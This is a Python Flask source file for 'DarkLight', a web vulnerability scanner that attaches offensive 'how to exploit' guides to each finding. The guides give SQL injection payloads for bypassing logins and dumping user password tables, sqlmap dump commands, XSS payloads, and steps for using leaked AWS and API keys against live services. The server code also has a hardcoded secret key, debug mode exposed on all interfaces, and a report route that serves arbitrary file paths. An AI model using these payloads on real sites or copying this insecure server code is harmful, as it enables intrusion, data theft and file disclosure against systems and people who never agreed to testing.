#!/usr/bin/env python3
"""
DarkLight Web GUI - Offline Vulnerability Scanner with Exploitation Guides
"""

from flask import Flask, render_template, request, jsonify, send_file
import asyncio
import sys
import os
import json
from datetime import datetime
import re

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.scraper import WebScraper
from src.analyzer import VulnerabilityAnalyzer
from src.reporter import ReportGenerator
import yaml

app = Flask(__name__)
app.config['SECRET_KEY'] = 'darklight-secret-key-2024'

# Load config
config_path = os.path.join(os.path.dirname(__file__), '..', 'config.yaml')
with open(config_path, 'r') as f:
    config = yaml.safe_load(f)

# Exploitation guides database (offline)
EXPLOITATION_GUIDES = {
    'sql_injection_coupon_code': {
        'title': 'SQL Injection in Coupon/Code Fields',
        'description': 'This vulnerability occurs when user input in coupon/code fields is directly inserted into SQL queries without sanitization.',
        'how_to_exploit': '''
1. Test for SQL Injection:
   - Enter a single quote ' in the coupon field and submit
   - If you get a database error, it's vulnerable
   - Try: ' OR '1'='1 to bypass authentication
   - Try: ' UNION SELECT 1,2,3,4-- - to extract data

2. Common Payloads:
   - Bypass: ' OR '1'='1' -- 
   - Extract database: ' UNION SELECT database()-- -
   - List tables: ' UNION SELECT table_name FROM information_schema.tables-- -
   - Dump data: ' UNION SELECT username,password FROM users-- -

3. Time-based Blind SQL Injection:
   - ' AND SLEEP(5)-- -
   - ' WAITFOR DELAY '00:00:05'-- -
''',
        'tools': '''
sqlmap - Automated SQL injection tool:
  sqlmap -u "http://target.com/cart.php" --data="coupon_code=test" --dbs
  sqlmap -u "http://target.com/cart.php" --data="coupon_code=test" -D database_name --tables
  sqlmap -u "http://target.com/cart.php" --data="coupon_code=test" -D database_name -T users --dump

Burp Suite - Manual testing with repeater:
  - Capture request with coupon code
  - Send to Repeater
  - Modify coupon_code parameter with SQL payloads

ffuf - Fuzzing for SQL injection:
  ffuf -u "http://target.com/cart.php" -X POST -d "coupon_code=FUZZ" -w sql_payloads.txt -fc 404
''',
        'resources': '''
Online Resources:
- SQL Injection Cheat Sheet: https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
- PortSwigger SQL Injection Labs: https://portswigger.net/web-security/sql-injection
- OWASP SQL Injection Prevention: https://owasp.org/www-community/attacks/SQL_Injection
'''
    },
    
    'xss_vulnerability': {
        'title': 'Cross-Site Scripting (XSS)',
        'description': 'XSS allows attackers to inject malicious scripts into web pages viewed by other users.',
        'how_to_exploit': '''
1. Test for Reflected XSS:
   - Enter <script>alert('XSS')</script> in input fields
   - Check URL parameters: ?q=<script>alert(1)</script>
   - Test with: "><img src=x onerror=alert(1)>

2. Test for Stored XSS:
   - Post malicious script in comments, profiles, etc.
   - Check if script executes when page is viewed

3. Common Payloads:
   <script>alert('XSS')</script>
   <img src=x onerror=alert(1)>
   <svg onload=alert(1)>
   javascript:alert('XSS')
''',
        'tools': '''
XSStrike - Advanced XSS scanner:
  xsstrike -u "http://target.com/cart.php?q=test"

Burp Suite Scanner - Automated XSS detection
OWASP ZAP - Open-source web security scanner
Browser DevTools - Test XSS in real-time (F12 -> Console)
''',
        'resources': '''
Online Resources:
- XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- XSS Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- OWASP XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
'''
    },
    
    'hardcoded_secret': {
        'title': 'Hardcoded Secrets (API Keys, Passwords)',
        'description': 'Sensitive information exposed directly in source code.',
        'how_to_exploit': '''
1. Locate the Secret:
   - Search JavaScript files for: api_key, token, password
   - Check browser DevTools -> Sources tab
   - Look for: const API_KEY = "sk-..."

2. Test the Secret:
   - Use the API key with the service (e.g., curl, Postman)
   - Check if the key has permissions (read, write, admin)
   - Try to access restricted resources

3. Exploitation Examples:
   # AWS keys
   aws configure set aws_access_key_id AKIA...
   aws s3 ls

   # API keys
   curl -H "Authorization: Bearer sk-..." https://api.service.com/data
''',
        'tools': '''
truffleHog - Search for secrets in git repositories:
  trufflehog git https://github.com/target/repo.git

gitleaks - Detect hardcoded secrets
strings - Extract readable strings:
  strings app.js | grep -i "api_key|secret|token"
''',
        'resources': '''
Online Resources:
- GitHub Secret Scanning: https://docs.github.com/en/code-security/secret-scanning
- OWASP Top 10 - Cryptographic Failures: https://owasp.org/Top10/A02_2021-Cryptographic-Failures/
'''
    },
    
    'potential_sql_injection': {
        'title': 'Potential SQL Injection',
        'description': 'Input field that may be used in database queries.',
        'how_to_exploit': '''
1. Identify the input field name that suggests database usage
2. Test with single quote: '
3. Test with: ' OR '1'='1
4. Use sqlmap for automated exploitation
''',
        'tools': 'Use sqlmap or manual testing with Burp Suite',
        'resources': 'SQL injection cheat sheets and OWASP guides'
    },
    
    'sql_injection_javascript': {
        'title': 'SQL Injection in JavaScript',
        'description': 'JavaScript code that may be vulnerable to SQL injection.',
        'how_to_exploit': '''
1. Look for AJAX calls that send user input
2. Modify request parameters using browser DevTools
3. Test SQL injection payloads
4. Use Burp Suite to intercept and modify requests
''',
        'tools': 'Browser DevTools, Burp Suite, OWASP ZAP',
        'resources': 'Client-side security testing guides'
    },
    
    'dangerous_function': {
        'title': 'Dangerous JavaScript Function',
        'description': 'eval() or document.write() usage can lead to code injection.',
        'how_to_exploit': '''
1. Find where user input is passed to eval()
2. Inject malicious JavaScript code
3. Example: eval("alert('XSS')")
4. For document.write, inject HTML/JS payloads
''',
        'tools': 'Browser DevTools, Burp Suite, BeEF Framework',
        'resources': 'DOM-based XSS prevention guides'
    },
    
    'missing_csrf': {
        'title': 'Missing CSRF Protection',
        'description': 'Forms without CSRF tokens are vulnerable to Cross-Site Request Forgery.',
        'how_to_exploit': '''
1. Create a malicious HTML page that submits to the vulnerable form
2. Trick authenticated user into visiting the page
3. The form will be submitted with the user's session
4. Use tools like CSRF PoC generator
''',
        'tools': 'Burp Suite CSRF PoC generator, OWASP CSRF Tester',
        'resources': 'OWASP CSRF Prevention Cheat Sheet'
    },
    
    'insecure_form_method': {
        'title': 'Insecure Form Method',
        'description': 'GET method used for sensitive data submission.',
        'how_to_exploit': '''
1. Data is exposed in URL
2. Can be bookmarked and shared
3. Logged in browser history and server logs
4. Easy to modify parameters
''',
        'tools': 'Browser DevTools, curl, Burp Suite',
        'resources': 'HTTP method security best practices'
    },
    
    'self_submitting_form': {
        'title': 'Self-Submitting Form',
        'description': 'Form submits to the same page, potentially vulnerable to CSRF.',
        'how_to_exploit': '''
1. May be vulnerable to CSRF attacks
2. Can be exploited with malicious HTML pages
3. Test with CSRF PoC generators
''',
        'tools': 'Burp Suite CSRF PoC generator',
        'resources': 'OWASP CSRF Prevention'
    },
    
    'sensitive_info_comment': {
        'title': 'Sensitive Information in Comments',
        'description': 'Passwords, keys, or other sensitive data in HTML comments.',
        'how_to_exploit': '''
1. View page source (Ctrl+U)
2. Search for comments containing sensitive data
3. Use the exposed information for further attacks
''',
        'tools': 'Browser View Source, curl, wget',
        'resources': 'Secure coding practices'
    }
}

DEFAULT_GUIDE = {
    'title': 'Generic Vulnerability',
    'description': 'This vulnerability requires further investigation.',
    'how_to_exploit': '''
1. Understand the vulnerability type
2. Review the vulnerable code snippet
3. Test with common payloads for this vulnerability type
4. Use automated tools to confirm exploitation
''',
    'tools': 'Burp Suite, OWASP ZAP, custom scripts',
    'resources': 'OWASP Testing Guide, PayloadsAllTheThings, HackTricks'
}

def find_vulnerable_line(html, code_snippet):
    """Find line number where vulnerability occurs"""
    if not code_snippet or not html:
        return 0
    try:
        lines = html.split('\n')
        snippet_first_line = code_snippet.split('\n')[0][:50] if code_snippet else ''
        for i, line in enumerate(lines, 1):
            if snippet_first_line and snippet_first_line in line:
                return i
    except:
        pass
    return 0

class VulnerabilityScanner:
    def __init__(self):
        self.scraper = WebScraper(config)
        self.analyzer = VulnerabilityAnalyzer(config)
        self.reporter = ReportGenerator()
    
    async def scan(self, url, crawl=False, max_pages=50):
        # Fetch page
        if crawl:
            pages_data = await self.scraper.crawl_site(url, max_pages)
        else:
            page_data = await self.scraper.fetch_page(url)
            pages_data = [page_data] if page_data else []
        
        if not pages_data:
            return [], None
        
        # Analyze vulnerabilities
        all_vulnerabilities = []
        for page_data in pages_data:
            vulns = self.analyzer.analyze_all(page_data)
            # Add source code and line number to each vulnerability
            for vuln in vulns:
                vuln['source_code'] = page_data.get('html', '')
                vuln['line_number'] = find_vulnerable_line(page_data.get('html', ''), vuln.get('code_snippet', ''))
                # Add exploitation guide
                guide = EXPLOITATION_GUIDES.get(vuln['type'], DEFAULT_GUIDE)
                vuln['exploitation_guide'] = guide
            all_vulnerabilities.extend(vulns)
        
        # Generate report
        report_path = self.reporter.generate_html_report(all_vulnerabilities, url, f"Found {len(all_vulnerabilities)} vulnerabilities")
        
        return all_vulnerabilities, report_path

scanner = VulnerabilityScanner()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/scan', methods=['POST'])
def scan():
    data = request.json
    url = data.get('url')
    crawl = data.get('crawl', False)
    max_pages = data.get('max_pages', 50)
    
    if not url:
        return jsonify({'error': 'URL is required'}), 400
    
    # Run scan asynchronously
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        vulnerabilities, report_path = loop.run_until_complete(scanner.scan(url, crawl, max_pages))
        loop.close()
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    
    # Convert vulnerabilities to serializable format
    vulns_serializable = []
    for v in vulnerabilities:
        guide = v.get('exploitation_guide', DEFAULT_GUIDE)
        vulns_serializable.append({
            'type': v['type'],
            'severity': v['severity'],
            'location': v['location'],
            'description': v['description'],
            'code_snippet': v.get('code_snippet', '')[:800],
            'line_number': v.get('line_number', 0),
            'exploitation_guide': {
                'how_to_exploit': guide.get('how_to_exploit', 'No exploitation guide available'),
                'tools': guide.get('tools', 'No tools listed'),
                'resources': guide.get('resources', 'No resources available')
            }
        })
    
    return jsonify({
        'vulnerabilities': vulns_serializable,
        'total': len(vulnerabilities),
        'report_path': report_path
    })

@app.route('/report/<path:filename>')
def download_report(filename):
    return send_file(filename, as_attachment=True)

if __name__ == '__main__':
    print("\n" + "="*60)
    print(" DarkLight Web GUI Starting...")
    print("="*60)
    print("\n Open your browser and go to: http://localhost:5000")
    print(" Press Ctrl+C to stop the server\n")
    app.run(debug=True, host='0.0.0.0', port=5000)
